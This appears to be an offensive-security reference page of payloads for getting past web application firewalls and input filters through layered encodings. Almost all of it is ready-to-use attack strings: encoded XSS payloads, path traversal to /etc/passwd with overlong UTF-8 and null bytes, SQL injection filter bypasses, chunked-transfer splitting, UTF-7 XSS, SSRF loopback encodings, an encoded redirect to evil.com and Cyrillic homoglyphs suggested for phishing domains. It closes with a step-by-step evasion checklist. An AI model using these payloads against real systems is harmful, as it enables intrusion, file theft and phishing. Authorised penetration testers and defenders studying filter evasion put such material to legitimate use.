---
id: "encoding-bypass-reference"
title: "Encoding Bypass & Filter Evasion Reference"
type: "payload"
category: "web-application"
subcategory: "bypass"
tags: ["encoding", "bypass", "waf", "filter-evasion", "url-encoding", "unicode", "double-encoding", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["xss-advanced-techniques", "sqli-payloads", "ssrf-payloads", "path-traversal"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Encoding Bypass & Filter Evasion Reference

## Why Encoding Bypasses Work
WAFs and filters pattern-match on specific strings. Encoding transforms the payload so it bypasses the filter but is decoded by the application into the original malicious form.

## URL Encoding Layers

### Single URL Encoding
```
< = %3C       > = %3E       " = %22
' = %27       / = %2F       \ = %5C
( = %28       ) = %29       space = %20
; = %3B       & = %26       = = %3D
# = %23       ? = %3F       . = %2E
: = %3A       @ = %40       | = %7C
{ = %7B       } = %7D       [ = %5B
] = %5D       ` = %60       ! = %21
$ = %24       ^ = %5E       ~ = %7E

# XSS: <script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E
```

### Double URL Encoding
```
# When the app decodes twice (proxy decodes once, app decodes again)
< = %253C      > = %253E      / = %252F
" = %2522      ' = %2527      . = %252E
; = %253B      space = %2520

# Path traversal: ../../etc/passwd
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# XSS: <script>
%253Cscript%253E
```

### Triple URL Encoding
```
# Rare but some apps decode 3 times
< = %25253C    / = %25252F

# ../
%25252e%25252e%25252f
```

## Unicode / UTF-8 Encoding

### Unicode Normalization
```
# Many apps normalize unicode to ASCII before processing
# But WAFs check BEFORE normalization

# Fullwidth characters (U+FF00 block):
< = ＜ (U+FF1C)     > = ＞ (U+FF1E)
/ = ／ (U+FF0F)     \ = ＼ (U+FF3C)
' = ＇ (U+FF07)     " = ＂ (U+FF02)
( = （ (U+FF08)     ) = ） (U+FF09)
; = ； (U+FF1B)     : = ： (U+FF1A)

# XSS with fullwidth:
＜script＞alert(1)＜／script＞

# Overlong UTF-8 (non-standard but some parsers accept):
/ = %c0%af or %e0%80%af
. = %c0%ae or %e0%80%ae
< = %c0%bc

# Path traversal with overlong UTF-8:
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

### Unicode Homoglyphs
```
# Characters that LOOK identical but are different codepoints:
a = а (Cyrillic U+0430)
e = е (Cyrillic U+0435)
o = о (Cyrillic U+043E)
c = с (Cyrillic U+0441)
p = р (Cyrillic U+0440)
i = і (Cyrillic U+0456)

# "script" with Cyrillic:
sсriрt  (c=U+0441, p=U+0440)

# Useful for: phishing domains, filter bypass, username confusion
admin vs аdmin (Cyrillic 'а')
```

## HTML Encoding
```
# Named entities:
< = &lt;       > = &gt;       " = &quot;
' = &apos;     & = &amp;      / = &sol;
= = &equals;   ( = &lpar;     ) = &rpar;

# Decimal entities:
< = &#60;      > = &#62;      " = &#34;
' = &#39;      / = &#47;      \ = &#92;

# Hex entities:
< = &#x3C;     > = &#x3E;     " = &#x22;
' = &#x27;     / = &#x2F;     \ = &#x5C;

# Padded entities (with leading zeros):
< = &#0060;    < = &#00060;   < = &#000060;
< = &#x003C;   < = &#x0003C;

# No semicolon (works in some contexts):
< = &#60       > = &#62       " = &#34

# XSS with mixed encoding:
&#x3C;script&#x3E;alert&#40;1&#41;&#x3C;/script&#x3E;
```

## JavaScript Encoding
```
# Unicode escape sequences:
< = \u003c     > = \u003e     / = \u002f
' = \u0027     " = \u0022     ( = \u0028
) = \u0029     . = \u002e

# Hex escape sequences:
< = \x3c       > = \x3e       / = \x2f
' = \x27       " = \x22

# Octal (in some contexts):
< = \074       > = \076       / = \057

# String construction (bypass keyword filters):
# Instead of "alert":
eval(String.fromCharCode(97,108,101,114,116)+'(1)')
eval(atob('YWxlcnQoMSk='))  # base64
eval('\u0061\u006c\u0065\u0072\u0074(1)')
window['al'+'ert'](1)
self['\x61lert'](1)

# Template literals:
`${alert(1)}`
```

## SQL Encoding Bypass
```
# Hex encoding:
SELECT = 0x53454C454354
admin = 0x61646D696E
' OR 1=1 = ' OR 0x31=0x31

# Char() function:
'admin' = CHAR(97,100,109,105,110)  -- MySQL
'admin' = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- Oracle/PostgreSQL

# Comment injection:
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FR/**/OM users
SE%00LECT username FROM users  -- Null byte

# Case variation:
SeLeCt, sElEcT, SELECT, select

# Alternative whitespace:
SELECT%09username%09FROM%09users  -- Tab
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
SELECT/**/username/**/FROM/**/users  -- Comment
```

## Path Traversal Encoding
```
# Standard:
../     ..\.    ..\

# URL encoded:
%2e%2e%2f    %2e%2e/    ..%2f    %2e%2e%5c

# Double URL encoded:
%252e%252e%252f    ..%252f    %252e%252e/

# Unicode/UTF-8:
..%c0%af     ..%c1%9c     ..%e0%80%af

# Overlong UTF-8:
%c0%ae%c0%ae%c0%af = ../

# Null byte (PHP < 5.3.4):
../../etc/passwd%00.jpg
../../etc/passwd\0.jpg

# OS-specific:
..;/  (Tomcat path parameter)
..\/  (backslash on Windows)
....//  (double encoding of ../)
..\../  (mixed separators)

# Java/Tomcat:
/..;/..;/etc/passwd
/;param=value/../admin
```

## Base64 Encoding
```
# Standard base64:
<script>alert(1)</script> = PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# URL-safe base64 (+ → -, / → _, no padding):
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg

# Some apps decode base64 in parameters:
?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
?redirect=aHR0cHM6Ly9ldmlsLmNvbQ==
```

## Chunked Transfer Encoding Bypass
```
# Split payload across chunks to evade WAF inspection:
Transfer-Encoding: chunked

7
<script
1
>
8
alert(1)
9
</script>
0

# WAF sees individual chunks (safe), app reassembles (malicious)
```

## Content-Type Tricks
```
# Switch Content-Type to bypass WAF rules on specific types:

# JSON WAF rules may not apply to:
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: application/xml

# Charset tricks:
Content-Type: application/json; charset=utf-7
Content-Type: text/html; charset=utf-32
Content-Type: text/html; charset=cp1252

# UTF-7 XSS:
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
# Decoded from UTF-7: <script>alert(1)</script>
```

## IP Address Encoding (SSRF)
```
# Decimal:      127.0.0.1 = 2130706433
# Hex:          127.0.0.1 = 0x7f000001
# Octal:        127.0.0.1 = 0177.0.0.01
# Mixed:        127.0.0.1 = 0x7f.0.0.1
# IPv6 mapped:  127.0.0.1 = ::ffff:127.0.0.1
# IPv6 compact: 127.0.0.1 = ::1
# Abbreviated:  127.0.0.1 = 127.1 (on Linux)
# With zeroes:  127.0.0.1 = 127.000.000.001
```

## Deep Dig Prompts
```
Given this filter/WAF blocking [describe what's blocked]:
1. Determine encoding level (how many times does the app decode?)
2. Try URL encoding → double encoding → unicode → UTF-8 overlong
3. Try mixed encoding (URL + HTML + JS combinations)
4. Test content-type switching
5. Try chunked transfer encoding to split payload
6. Use encoding-specific payloads from this reference
```
